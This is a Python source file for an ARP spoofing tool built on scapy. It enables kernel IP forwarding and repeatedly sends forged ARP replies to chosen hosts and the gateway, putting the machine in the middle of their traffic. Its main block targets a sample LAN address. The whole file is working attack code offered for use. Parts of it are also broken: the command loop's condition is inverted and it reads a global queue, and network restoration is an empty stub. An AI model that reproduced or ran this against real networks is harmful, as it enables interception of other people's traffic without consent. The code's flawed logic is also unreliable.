#!/usr/bin/env python3

__author__ = 'foxtrot_charlie'
__licence__ = 'GPLv2'


import sys
import os
import threading
import logging
import queue
import time
from scapy.all import *


import utils


logger = logging.getLogger("ARPSPOOFER")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('dnsdeceiver.log')
formatter = logging.Formatter("%(name)s; %(asctime)s; %(levelname)s; %(message)s", "%Y-%m-%d %H:%M:%S")
fh.setFormatter(formatter)
logger.addHandler(fh)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

DEFAULT_GATEWAY = '192.168.0.1'
CommandQueue = queue.Queue()


class ARPspoofer(threading.Thread):
    """
    ARPspoofer class is used to provide ARP spoofing capability
    ARPspoofer can work in two modes. One mode provides ability
    to spoof ARP responses only for a specific target. Another
    option is to spoof whole ARP traffic in the network.
    """
    def __init__(self, event, queue, config={}):
        """"""
        threading.Thread.__init__(self)
        self.event = event
        '''
        self.kernel_ipv4fwd = None
        '''
        self.gw = None
        self.network = None
        self.delay = None
        self.interface = None
        self.targets = []
        self.ip_mac = {}
        self.myself = None
        self.queue = queue
        logger.info("Initializing ARPspoofer...")
        if os.getuid():
            logger.error("Run me as root!")
            sys.exit(-1)

        logger.info("Loading config...")
        self.__config_load(config)

    def __config_load(self, config={}):
        """"""
        self.kernel_ipv4fwd = config.get('kernel_ip4_fwd', 1)
        if self.kernel_ipv4fwd:
            logger.warning("Used kernel ipv4 forwarding feature.")
            os.system("echo {} > /proc/sys/net/ipv4/ip_forward".format(self.kernel_ipv4fwd))
            logger.info("Kernel IPv4 forwarding enabled")

        else:
            logger.error("Not implemented!")

        self.gw = config.get('gateway', None)
        if not self.gw:
            logger.critical("IP of gateway not specified! Using default one: {}".format(DEFAULT_GATEWAY))
            self.gw = DEFAULT_GATEWAY
            mac = utils.arpping(self.gw)
            self.ip_mac[self.gw] = mac


    def __config_reload(self, config={}):
        """"""
        pass


    def __spoof(self):
        for ip, mac in self.ip_mac.items():
            if ip == self.gw:
                continue
            logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
            pkt = ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
            logger.debug('{}'.format(pkt.summary()))
            send(pkt)
            logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
            pkt = ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
            logger.debug('{}'.format(pkt.summary()))
            send(pkt)

    def __execute_cmd(self, cmd):
        if not isinstance(cmd, list):
            logger.critical('Unknown command! {}'.format(cmd))

        elif len(cmd) < 1:
            logger.critical('Unknown command! {}'.format(cmd))

        elif len(cmd) == 1:

            if cmd[0].strip() == 'p':
                logger.debug('Pausing...')

            elif cmd[0].strip() == 'r':
                logger.debug('Running...')

            else:
                logger.critical('Unknown command!')

        elif len(cmd) == 2:

            if cmd[0].strip() == 'a':
                logger.debug('Adding entry {} to target queue!'.format(cmd[1]))
                self.targets.append(cmd[1])

            elif cmd[0].strip() == 'd':
                logger.debug('Removing entry {} from target queue!'.format(cmd[1]))
                try:
                    self.targets.remove(cmd[1])
                except ValueError:
                    logger.warning('Input: {} not in target list! Cannot remove!'.format(cmd[1]))

        else:
            logger.critical('Unknown command!')
            raise AttributeError

    def __spoof_loop(self):
        try:
            while not self.event.is_set():
                logger.debug('Iterating...')

                while self.queue.empty():
                    cmd = q.get()
                    logger.debug('New command: {}'.format(cmd))
                    self.__execute_cmd(cmd)

                for t in self.targets:
                    if t not in self.ip_mac:
                        mac = utils.arpping(t)
                        self.ip_mac[t] = mac

                self.__spoof()
                time.sleep(0.10)
        except KeyboardInterrupt:
            logger.info('Exiting...')

    def run(self):
        self.__spoof_loop()

    def __restore_network(self):
        pass

    def __del__(self):
        """"""
        try:
            if self.kernel_ipv4fwd:
                self.kernel_ipv4fwd = 0
                os.system("echo {} > /proc/sys/net/ipv4/ip_forward".format(self.kernel_ipv4fwd))
                logger.info("Kernel IPv4 forwarding disabled")
        except AttributeError:
            pass



if __name__ == '__main__':
    q = queue.Queue()
    q.put(['a', '192.168.0.16'])
    e = threading.Event()
    AS = ARPspoofer(event=e, queue=q)
    AS.run()
    logger.critical('Quiting arpspoofer')